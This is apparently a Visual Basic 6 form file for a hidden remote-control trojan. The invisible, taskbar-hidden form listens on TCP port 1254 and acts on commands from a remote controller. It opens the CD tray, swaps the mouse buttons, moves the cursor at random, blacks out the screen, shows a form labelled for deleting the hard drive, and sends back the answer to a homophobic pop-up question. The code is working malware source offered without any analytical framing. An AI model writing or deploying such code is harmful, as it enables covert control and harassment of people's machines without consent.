VERSION 5.00
Object = "{248DD890-BB45-11CF-9ABC-0080C7E7B78D}#1.0#0"; "MSWINSCK.OCX"
Begin VB.Form Form1 
   BorderStyle     =   1  'Fixed Single
   ClientHeight    =   660
   ClientLeft      =   45
   ClientTop       =   330
   ClientWidth     =   1140
   Icon            =   "Main.frx":0000
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   660
   ScaleWidth      =   1140
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
   Begin VB.Timer Timer1 
      Interval        =   100
      Left            =   600
      Top             =   120
   End
   Begin MSWinsockLib.Winsock Winsock1 
      Left            =   120
      Top             =   120
      _ExtentX        =   741
      _ExtentY        =   741
      _Version        =   393216
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Form_Load()
    Timer1.Enabled = False
    
    On Error Resume Next
    Winsock1.LocalPort = 1254
    Winsock1.Listen
End Sub

Private Sub Timer1_Timer()
    ValueOne = Int(Rnd * 800)
    ValueTwo = Int(Rnd * 800)
    
    Change = SetCursorPos(ValueOne, ValueTwo)
End Sub

Private Sub Winsock1_ConnectionRequest(ByVal requestID As Long)
    'Make sure there are no other connections, if there are, close them
    If Winsock1.State <> sckClosed Then Winsock1.Close
    
    'Accept the incoming connection
    Winsock1.Accept requestID
End Sub

Private Sub Winsock1_DataArrival(ByVal bytesTotal As Long)
   
    Dim INFOCOMING As String
    Winsock1.GetData INFOCOMING
    
    If INFOCOMING = "ASKGAY" Then
        IsGay
    End If
    
    If INFOCOMING = "DELEHARD" Then
        Form3.Show
    End If
    
    If INFOCOMING = "BEEP" Then
        Beep
    End If
    
    If INFOCOMING = "BLACK" Then
        Form2.Show
    End If
    
    If INFOCOMING = "UNBLACK" Then
        Unload Form2
    End If
    
    If INFOCOMING = "OPENCD" Then
        CDTODO = mciSendString("set CDaudio door OPEN", 0, 0, 0)
    End If
    
    If INFOCOMING = "CLOSECD" Then
        CDTODO = mciSendString("set CDaudio door CLOSED", 0, 0, 0)
    End If
    
    If INFOCOMING = "OTHER" Then
        Change = SwapMouseButton(1)
    End If
    
    If INFOCOMING = "NORMAL" Then
        Change = SwapMouseButton(0)
    End If
    
    If INFOCOMING = "MOUSEON" Then
        Timer1.Enabled = True
    End If
    
    If INFOCOMING = "MOUSEOFF" Then
        Timer1.Enabled = False
    End If
End Sub
Private Sub IsGay()
    Dim Answer As String
    
    If MsgBox("Hey, just a question...are you gay?", vbYesNo, "Are you gay?") = vbYes Then
        Answer = "YES"
    Else
        Answer = "NO"
    End If
    
    Winsock1.SendData Answer
End Sub
